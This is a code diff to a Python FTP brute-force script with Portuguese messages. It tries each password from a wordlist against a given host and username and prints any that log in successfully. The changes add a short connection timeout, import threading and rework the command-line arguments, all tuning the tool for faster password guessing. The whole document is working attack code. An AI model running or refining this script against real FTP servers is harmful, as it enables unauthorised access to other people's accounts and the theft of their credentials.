@@ -1,8 +1,10 @@
-from ftplib import FTP 
-from sys import exit
 import os
 import socket
 import argparse
+import threading
+
+from ftplib import FTP 
+from sys import exit
 from termcolor import colored
 
 def banner():
@@ -25,14 +27,13 @@ def banner():
 def check(host, username, passwd):
 
     try:
-        ftp = FTP(host)
+        ftp = FTP(host, timeout=0.5)
         ftp.login(username, passwd)
-
         print_result(host, username, passwd)
-        return 1
+        
     except:
         print (colored("[+]user={0}\tpass={1}\tfailed".format(username, \
-                                                                 passwd), 'red'))
+                                                        passwd), 'red'))
 
 def loadWordlist(host, username, wordlist):
 
@@ -43,10 +44,8 @@ def loadWordlist(host, username, wordlist):
         for line in read:
             line = line.strip()
             check(host, username, line)
-
     except:
         print("Nao foi possivel abrir o arquivo")
-        exit(1)
 
 def print_result(host, username, passwd):
 
@@ -59,13 +58,18 @@ def print_result(host, username, passwd):
 [+]Password = {2}                     
 -------------------------------------------
         '''.format(host, username, passwd), 'green'))
-
+        
 def main():
 
-    parser = argparse.ArgumentParser(description="ftp brute force")
-    parser.add_argument('--host',     action="store", dest="host",      required=True)
-    parser.add_argument("--user",     action="store", dest="user",      required=True)
-    parser.add_argument("--wordlist", action="store", dest="wordlist",  required=True)
+    parser = argparse.ArgumentParser(add_help=False)
+    parser.add_argument('--host',     action="store", dest="host",\
+                          required=True)
+   
+    parser.add_argument("--user",     action="store", dest="user",\
+                          required=True)
+   
+    parser.add_argument("--wordlist", action="store", dest="wordlist",\
+                          required=True)
 
     given_args = parser.parse_args()
 
